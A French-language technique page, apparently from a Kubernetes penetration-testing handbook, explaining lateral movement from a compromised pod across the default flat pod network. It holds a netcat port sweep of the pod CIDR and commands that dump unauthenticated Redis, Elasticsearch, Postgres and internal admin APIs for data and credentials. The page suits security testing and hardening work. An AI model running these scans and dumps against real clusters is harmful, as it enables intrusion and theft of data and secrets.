---
title: "Pivotement de pod à pod : atteindre d'autres workloads sur le réseau plat"
order: 2
description: "Par défaut, chaque pod peut atteindre tous les autres pods et services du cluster, car Kubernetes n'applique aucune isolation réseau sans NetworkPolicy. Un attaquant présent dans un pod scanne le réseau des pods et se connecte directement aux autres workloads et à leurs services sous-jacents, qui sont fréquemment non authentifiés en interne, afin de dérober des données et des identifiants et d'étendre son point d'appui."
keywords:
  - pod pivoting
  - flat network
  - pod network
  - internal services
  - lateral movement
---

# Pivotement de pod à pod

Le réseau de Kubernetes est plat par défaut : chaque pod a une IP que tout autre pod et service peut atteindre, et aucune isolation n'existe tant qu'une NetworkPolicy n'est pas appliquée. Depuis un pod compromis, un attaquant atteint donc chaque workload du cluster au niveau réseau. Les services internes supposent que seuls des pairs de confiance du cluster se connectent, ils sont donc souvent non authentifiés, de sorte qu'une connexion directe suffit à lire des bases de données, des caches, des files de messages et des API internes, et à récolter les identifiants qu'ils détiennent.

Cartographier et atteindre les voisins :

```bash
# local subnet and the pod/service networks
ip -4 addr; ip route
# endpoints (real pod IPs) are the best targets, via the API if reachable
kubectl get endpoints -A -o wide 2>/dev/null
# sweep the pod CIDR for common service ports
for ip in 10.244.0.{1..254}; do for p in 6379 5432 3306 9200 27017 8080; do
  (nc -z -w1 $ip $p 2>/dev/null && echo "$ip:$p open") & done; done; wait
```

## Se connecter et piller

```bash
# unauthenticated internal services are common; examples:
redis-cli -h 10.244.0.5 keys '*'                        # redis with no auth
curl -s http://10.244.0.6:9200/_search?size=100         # elasticsearch
psql -h 10.244.0.7 -U postgres -c '\l'                  # postgres with trust/weak auth
# an internal HTTP API reachable pod-to-pod often needs no token
curl -s http://10.244.0.8:8080/admin
```

## Notes d'exploitation

- Ciblez directement les IP des pods d'endpoint plutôt que les VIP de service lorsque c'est possible ; atteindre le pod contourne toutes les hypothèses intégrées à la couche de service.
- Les magasins de données internes (Redis, Elasticsearch, MongoDB, API HTTP internes) sont les trouvailles les plus riches, car ils sont si souvent non authentifiés sur le réseau du cluster ; videz-les pour en extraire données et identifiants intégrés.
- Une NetworkPolicy, si elle est présente, restreint cela ; voir [Contournement de NetworkPolicy](../network/networkpolicy-bypass.md). L'hypothèse du réseau plat ne tient que jusqu'à l'existence d'une politique, que beaucoup de clusters n'ajoutent jamais.
- Combinez avec [Découverte des services et du réseau](../cluster-enumeration/service-and-network-discovery.md) pour trouver des cibles par DNS.

## Références

- [Kubernetes : réseau du cluster](https://kubernetes.io/docs/concepts/cluster-administration/networking/)
- [Kubernetes : network policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [HackTricks : réseau Kubernetes](https://book.hacktricks.xyz/pentesting-cloud/kubernetes-security)
